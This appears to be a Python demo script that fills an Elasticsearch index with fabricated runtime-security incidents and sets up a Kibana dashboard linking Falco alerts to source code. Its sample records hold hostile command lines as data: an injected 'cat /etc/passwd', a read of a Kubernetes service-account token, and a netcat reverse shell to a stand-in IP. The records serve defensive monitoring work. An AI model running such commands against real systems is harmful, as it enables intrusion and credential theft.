import os
import json
import requests
from datetime import datetime, timezone, timedelta

ES_HOST = os.getenv("ELASTICSEARCH_URL", "http://localhost:9200")
KIBANA_URL = os.getenv("KIBANA_URL", "http://localhost:5601")
HEADERS = {"kbn-xsrf": "true", "Content-Type": "application/json"}

INCIDENTS = [
    {
        "falco": {
            "rule": "Terminal Shell Spawned in Production Container",
            "priority": "CRITICAL",
            "output": "Interactive shell spawned in container (user=appuser process=sh parent=python)"
        },
        "origintrace": {
            "engine": "Falco_eBPF",
            "reachability_score": 85,
            "reachability_verdict": "CONFIRMED_EXPLOITABLE",
            "source_origin": {
                "file": "sample_workload/app.py",
                "function": "diagnostic_ping",
                "line": 36,
                "sink": "os.system"
            }
        },
        "process": {
            "name": "sh",
            "cmdline": "sh -c ping -c 1 127.0.0.1; cat /etc/passwd",
            "parent": "python"
        },
        "container": {
            "name": "data-gateway",
            "image": "ghcr.io/enterprise/data-gateway:v1.0.0 (Cosign Verified)"
        },
        "kubernetes": {
            "pod_name": "data-gateway-659f8-x2k41",
            "namespace": "production"
        }
    },
    {
        "falco": {
            "rule": "Unauthorized Access to Kubernetes Service Account Token",
            "priority": "ERROR",
            "output": "Sensitive token file accessed by unauthorized binary"
        },
        "origintrace": {
            "engine": "Falco_eBPF",
            "reachability_score": 90,
            "reachability_verdict": "CONFIRMED_EXPLOITABLE",
            "source_origin": {
                "file": "app/src/main.py",
                "function": "verify_api_token",
                "line": 84,
                "sink": "open(/var/run/secrets/kubernetes.io/serviceaccount)"
            }
        },
        "process": {
            "name": "python",
            "cmdline": "python -c open('/var/run/secrets/kubernetes.io/serviceaccount/token')",
            "parent": "uvicorn"
        },
        "container": {
            "name": "secops-api",
            "image": "ghcr.io/enterprise/secops-api:1.0.0 (Cosign Verified)"
        },
        "kubernetes": {
            "pod_name": "secops-api-7b89-9v11",
            "namespace": "production"
        }
    },
    {
        "falco": {
            "rule": "Outbound Reverse Shell Network Activity",
            "priority": "CRITICAL",
            "output": "Outbound TCP connection initiated by shell binary to external IP"
        },
        "origintrace": {
            "engine": "Falco_eBPF",
            "reachability_score": 100,
            "reachability_verdict": "CONFIRMED_EXPLOITABLE",
            "source_origin": {
                "file": "sample_workload/app.py",
                "function": "diagnostic_ping",
                "line": 36,
                "sink": "subprocess.Popen"
            }
        },
        "process": {
            "name": "nc",
            "cmdline": "nc 198.51.100.1 4444 -e /bin/sh",
            "parent": "sh"
        },
        "container": {
            "name": "data-gateway",
            "image": "ghcr.io/enterprise/data-gateway:v1.0.0"
        },
        "kubernetes": {
            "pod_name": "data-gateway-659f8-x2k41",
            "namespace": "production"
        }
    },
    {
        "falco": {
            "rule": "Static Vulnerability - No Runtime Trigger",
            "priority": "WARNING",
            "output": "Potential SSRF pattern detected in static AST code scanning"
        },
        "origintrace": {
            "engine": "Semgrep_SAST",
            "reachability_score": 25,
            "reachability_verdict": "STATIC_ONLY",
            "source_origin": {
                "file": "security/semgrep/tests/rules_test_suite.py",
                "function": "vulnerable_ssrf",
                "line": 28,
                "sink": "requests.get"
            }
        },
        "process": {
            "name": "semgrep",
            "cmdline": "semgrep scan --config=security/semgrep/semgrep.yml",
            "parent": "ci-runner"
        },
        "container": {
            "name": "ci-runner",
            "image": "semgrep/semgrep:latest"
        },
        "kubernetes": {
            "pod_name": "ci-runner-88f-zk1",
            "namespace": "ci-builds"
        }
    }
]

def refresh_data():
    now = datetime.now(timezone.utc)
    index_name = f"origintrace-events-{now.strftime('%Y.%m.%d')}"
    
    # 1. Ingest events distributed over the last 15 minutes and up to 24 hours
    # This guarantees data is present whether time filter is "Last 15 minutes", "Last 1 hour", or "Last 24 hours"
    delays_minutes = [0, 1, 2, 3, 5, 8, 10, 12, 14, 20, 45, 90, 180, 360, 720]
    total_ingested = 0
    for d in delays_minutes:
        ts = (now - timedelta(minutes=d)).isoformat()
        for inc in INCIDENTS:
            doc = dict(inc)
            doc["@timestamp"] = ts
            r = requests.post(f"{ES_HOST}/{index_name}/_doc", json=doc)
            if r.status_code in [200, 201]:
                total_ingested += 1
    
    print(f"Successfully ingested {total_ingested} live events into '{index_name}'.")
    
    # 2. Update the Dashboard to enable timeRestore with Last 24 Hours as default view
    dash_body = {
        "attributes": {
            "title": "[OriginTrace] DevSecOps Runtime-to-Source Intelligence Dashboard",
            "description": "SIEM Dashboard linking Falco eBPF runtime alerts to Semgrep AST code origins with zero ambiguity",
            "panelsJSON": json.dumps([
                {
                    "version": "8.15.0",
                    "type": "visualization",
                    "gridData": {"x": 0, "y": 0, "w": 24, "h": 14, "i": "1"},
                    "panelIndex": "1",
                    "embeddableConfig": {},
                    "panelRefName": "panel_1"
                },
                {
                    "version": "8.15.0",
                    "type": "visualization",
                    "gridData": {"x": 24, "y": 0, "w": 24, "h": 14, "i": "2"},
                    "panelIndex": "2",
                    "embeddableConfig": {},
                    "panelRefName": "panel_2"
                },
                {
                    "version": "8.15.0",
                    "type": "search",
                    "gridData": {"x": 0, "y": 14, "w": 48, "h": 20, "i": "3"},
                    "panelIndex": "3",
                    "embeddableConfig": {},
                    "panelRefName": "panel_3"
                }
            ]),
            "optionsJSON": json.dumps({"useMargins": True, "hidePanelTitles": False}),
            "version": 1,
            "timeRestore": True,
            "timeFrom": "now-24h",
            "timeTo": "now",
            "kibanaSavedObjectMeta": {
                "searchSourceJSON": json.dumps({
                    "query": {"query": "", "language": "kuery"},
                    "filter": []
                })
            }
        },
        "references": [
            {
                "name": "panel_1",
                "type": "visualization",
                "id": "origintrace-reachability-donut"
            },
            {
                "name": "panel_2",
                "type": "visualization",
                "id": "origintrace-threat-priority-bar"
            },
            {
                "name": "panel_3",
                "type": "search",
                "id": "origintrace-detailed-audit-table"
            }
        ]
    }
    
    r_dash = requests.post(f"{KIBANA_URL}/api/saved_objects/dashboard/origintrace-kibana-overview?overwrite=true", headers=HEADERS, json=dash_body)
    print(f"Kibana Dashboard updated (timeRestore: True): {r_dash.status_code}")

if __name__ == "__main__":
    refresh_data()
